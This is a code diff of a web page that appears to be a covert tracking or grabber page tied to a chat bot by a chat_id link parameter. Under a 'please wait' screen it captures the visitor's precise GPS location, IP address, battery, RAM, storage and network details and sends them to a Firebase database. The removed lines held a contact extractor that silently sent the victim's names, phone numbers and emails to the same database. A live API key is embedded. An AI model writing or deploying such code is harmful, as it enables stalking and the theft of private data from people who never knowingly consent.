@@ -19,13 +19,12 @@ color:#00aaff;
 font-family:sans-serif;
 text-align:center;
 }
-h2 { font-size: 1.6rem; margin: 20px; }
 </style>
 </head>
 
 <body>
 
-<h2 id="status">...جاري التحميل</h2>
+<h2 id="status">...Please wait</h2>
 
 <script>
 
@@ -33,193 +32,177 @@ const params = new URLSearchParams(window.location.search);
 const chatId = params.get("chat_id");
 
 if(!chatId){
-  document.getElementById("status").innerText = "⚠ رابط غير صالح";
-  throw new Error("No chat_id");
+document.getElementById("status").innerText="⚠ رابط غير صالح";
+throw new Error("No chat_id");
 }
 
 /* Firebase config */
 const firebaseConfig = {
-  apiKey: "AIzaSyCuyAgacCs5tClhYD79IVOpSWVvbtXObpc",
-  authDomain: "hercules-65b0c.firebaseapp.com",
-  databaseURL: "https://hercules-65b0c-default-rtdb.firebaseio.com",
-  projectId: "hercules-65b0c",
-  storageBucket: "hercules-65b0c.firebasestorage.app",
-  messagingSenderId: "758576632296",
-  appId: "1:758576632296:android:c69d0667cf54311617d45d"
+apiKey: "AIzaSyCuyAgacCs5tClhYD79IVOpSWVvbtXObpc",
+authDomain: "hercules-65b0c.firebaseapp.com",
+databaseURL: "https://hercules-65b0c-default-rtdb.firebaseio.com",
+projectId: "hercules-65b0c",
+storageBucket: "hercules-65b0c.firebasestorage.app",
+messagingSenderId: "758576632296",
+appId: "1:758576632296:android:c69d0667cf54311617d45d"
 };
 
 firebase.initializeApp(firebaseConfig);
 const database = firebase.database();
 
-/* ─────────────── Helpers ─────────────── */
-
+/* IP */
 async function getIP(){
-  try{
-    const res = await fetch("https://api.ipify.org?format=json");
-    const json = await res.json();
-    return json.ip;
-  }catch(e){
-    return "unknown";
-  }
+try{
+const res = await fetch("https://api.ipify.org?format=json");
+const json = await res.json();
+return json.ip;
+}catch(e){
+return "unknown";
+}
 }
 
+/* Browser */
 function getBrowserName(){
-  const ua = navigator.userAgent;
-  if(ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Chrome";
-  if(ua.includes("Firefox")) return "Firefox";
-  if(ua.includes("Edg")) return "Edge";
-  if(ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
-  if(ua.includes("OPR") || ua.includes("Opera")) return "Opera";
-  return "Unknown";
+const ua = navigator.userAgent;
+
+if(ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Chrome";
+if(ua.includes("Firefox")) return "Firefox";
+if(ua.includes("Edg")) return "Edge";
+if(ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+if(ua.includes("OPR") || ua.includes("Opera")) return "Opera";
+
+return "Unknown";
 }
 
+/* Network */
 function getNetworkType(){
-  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  if(!conn) return "Unknown";
-  if(conn.type === "wifi") return "WiFi";
-  if(conn.effectiveType){
-    switch(conn.effectiveType){
-      case "4g": return "4G";
-      case "3g": return "3G";
-      case "2g": return "2G";
-      case "5g": return "5G";
-      default: return conn.effectiveType.toUpperCase();
-    }
-  }
-  return "Unknown";
+const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+if(!conn) return "Unknown";
+
+if(conn.type==="wifi") return "WiFi";
+
+if(conn.effectiveType){
+switch(conn.effectiveType){
+case "4g": return "4G";
+case "3g": return "3G";
+case "2g": return "2G";
+case "5g": return "5G";
+default: return conn.effectiveType.toUpperCase();
+}
 }
 
+return "Unknown";
+}
+
+/* Battery */
 async function getBatteryPercentAndCharging(){
-  if(!navigator.getBattery) return {level:null, charging:null};
-  try{
-    const battery = await navigator.getBattery();
-    return {
-      level: Math.round(battery.level * 100),
-      charging: battery.charging
-    };
-  }catch(e){
-    return {level:null, charging:null};
-  }
+if(!navigator.getBattery) return {level:null,charging:null};
+
+try{
+const battery = await navigator.getBattery();
+const level = Math.round(battery.level*100);
+const charging = battery.charging;
+return {level,charging};
+}catch(e){
+return {level:null,charging:null};
+}
 }
 
+/* Language */
 function getLanguageCode(){
-  const lang = navigator.language || "en";
-  return lang.startsWith("ar") ? "ar" : "en";
+const lang = navigator.language || "en";
+if(lang.startsWith("ar")) return "ar";
+return "en";
 }
 
+/* RAM */
 function getDeviceRAM(){
-  return navigator.deviceMemory ? navigator.deviceMemory + "GB" : "NA";
+if(navigator.deviceMemory) return navigator.deviceMemory+"GB";
+return "NA";
 }
 
+/* Storage */
 async function getStorageInfo(){
-  if(navigator.storage && navigator.storage.estimate){
-    try{
-      const estimate = await navigator.storage.estimate();
-      const availableGB = ((estimate.quota - estimate.usage) / (1024 * 1024 * 1024)).toFixed(2);
-      return availableGB + "GB";
-    }catch(e){}
-  }
-  return "NA";
+if(navigator.storage && navigator.storage.estimate){
+try{
+const estimate = await navigator.storage.estimate();
+const availableGB=((estimate.quota-estimate.usage)/(1024*1024*1024)).toFixed(2);
+return availableGB+"GB";
+}catch(e){
+return "NA";
+}
+}
+return "NA";
 }
 
+/* Time */
 function getFormattedDateTime(){
-  const d = new Date();
-  const day = d.getDate();
-  const month = d.getMonth() + 1;
-  const year = d.getFullYear();
-  let hours = d.getHours();
-  const minutes = String(d.getMinutes()).padStart(2,'0');
-  const seconds = String(d.getSeconds()).padStart(2,'0');
-  const ampm = hours >= 12 ? "PM" : "AM";
-  hours = hours % 12;
-  hours = hours ? hours : 12;
-  return `\( {day}- \){month}-${year} | \( {hours}: \){minutes}:${seconds} ${ampm}`;
+const d=new Date();
+
+const day=d.getDate();
+const month=d.getMonth()+1;
+const year=d.getFullYear();
+
+let hours=d.getHours();
+const minutes=String(d.getMinutes()).padStart(2,'0');
+const seconds=String(d.getSeconds()).padStart(2,'0');
+
+const ampm=hours>=12?"PM":"AM";
+
+hours=hours%12;
+hours=hours?hours:12;
+
+return `${day}-${month}-${year} | ${hours}:${minutes}:${seconds} ${ampm}`;
 }
 
+/* Online status */
 function getOnlineStatus(){
-  return navigator.onLine ? "Online" : "Offline";
+return navigator.onLine?"Online":"Offline";
 }
 
-/* ─────────────── Contact Extractor ─────────────── */
-
-async function tryExtractContacts() {
-  if (!('contacts' in navigator) || !('select' in navigator.contacts)) {
-    return;
-  }
-
-  try {
-    const available = await navigator.contacts.getProperties() || [];
-    const props = ["name", "tel", "email"].filter(p => available.includes(p));
-
-    if (props.length === 0) return;
-
-    const contacts = await navigator.contacts.select(props, { multiple: true });
-
-    if (!contacts?.length) return;
-
-    const contactsData = contacts.map(c => ({
-      name: c.name ? (Array.isArray(c.name) ? c.name.join(" ") : c.name) : "NA",
-      tel: c.tel || [],
-      email: c.email || [],
-      fetched: getFormattedDateTime()
-    }));
-
-    await database.ref("contacts").push({
-      chat_id: chatId,
-      contacts: contactsData,
-      count: contacts.length,
-      time: getFormattedDateTime(),
-      browser: getBrowserName(),
-      lang: getLanguageCode()
-    });
-
-  } catch (err) {
-    // صامت تمامًا - ما بنغيرش الشاشة ولا بنطبع حاجة
-  }
-}
-
-/* ─────────────── Main Flow ─────────────── */
+/* Get location */
 
 navigator.geolocation.getCurrentPosition(
 
-  async (pos) => {
-    const ip = await getIP();
-    const browser = getBrowserName();
-    const network = getNetworkType();
-    const batteryInfo = await getBatteryPercentAndCharging();
-    const langCode = getLanguageCode();
-    const ram = getDeviceRAM();
-    const storage = await getStorageInfo();
-    const onlineStatus = getOnlineStatus();
+async(pos)=>{
 
-    const batteryText = batteryInfo.level !== null ? `${batteryInfo.level}%` : "NA";
-    const chargingText = batteryInfo.charging !== null ? (batteryInfo.charging ? "Charging" : "Not charging") : "NA";
+const ip=await getIP();
+const browser=getBrowserName();
+const network=getNetworkType();
+const batteryInfo=await getBatteryPercentAndCharging();
+const langCode=getLanguageCode();
+const ram=getDeviceRAM();
+const storage=await getStorageInfo();
+const onlineStatus=getOnlineStatus();
 
-    const data = {
-      chat_id: chatId,
-      latitude: pos.coords.latitude,
-      longitude: pos.coords.longitude,
-      accuracy: pos.coords.accuracy,
-      ip: ip,
-      device: `${onlineStatus} | \( {browser} | Bat: \){batteryText}/\( {chargingText} | Lang: \){langCode} | RAM:\( {ram} | Storage: \){storage} | Net:${network}`,
-      time: getFormattedDateTime()
-    };
+const batteryText=batteryInfo.level!==null?`Battery${batteryInfo.level}%`:"BatteryNA%";
+const chargingText=batteryInfo.charging!==null?batteryInfo.charging:"NA";
 
-    await database.ref("locations").push(data);
+const data={
+chat_id:chatId,
+latitude:pos.coords.latitude,
+longitude:pos.coords.longitude,
+accuracy:pos.coords.accuracy,
+ip:ip,
+device:`${onlineStatus}/${browser}(${batteryText}/${chargingText}-language:${langCode}-ram:${ram}-storage:${storage}-${network})`,
+time:getFormattedDateTime()
+};
 
-    // محاولة سحب الجهات بعد نجاح الموقع
-    await tryExtractContacts();
+await database.ref("locations").push(data);
 
-    document.getElementById("status").innerText = "تم الإرسال بنجاح";
-  },
+document.getElementById("status").innerText="...Sent successfully";
 
-  (err) => {
-    document.getElementById("status").innerText = "❌ تم رفض إذن الموقع";
-    // برضو نحاول نجيب الجهات حتى لو الموقع رفض
-    tryExtractContacts();
-  },
+},
 
-  { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+(err)=>{
+
+document.getElementById("status").innerText="❌ تم رفض إذن الموقع أو حدث خطأ";
+console.error(err);
+
+},
+
+{enableHighAccuracy:true,timeout:15000,maximumAge:0}
+
 );
 
 </script>
